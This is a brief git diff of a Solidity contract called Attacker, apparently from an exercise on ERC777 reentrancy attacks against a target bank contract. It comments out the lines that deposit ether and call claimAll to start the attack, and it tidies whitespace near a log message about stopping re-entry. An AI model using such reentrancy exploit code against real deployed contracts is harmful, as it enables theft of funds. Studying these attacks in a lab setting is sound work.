@@ -38,10 +38,12 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 
-
+/*
         emit Deposit(msg.value); // Emit event for the deposit amount
         bank.deposit{value: msg.value}();
         bank.claimAll();
+*/
+		
 	}
 
 	/*
@@ -79,7 +81,7 @@ contract Attacker is AccessControl, IERC777Recipient {
         } else {
 			console.log("Stopped re-entering. Depth: %d, Bank ETH Balance: %d", depth, address(bank).balance);
 
-		} 
+		}
 	}
 
 }
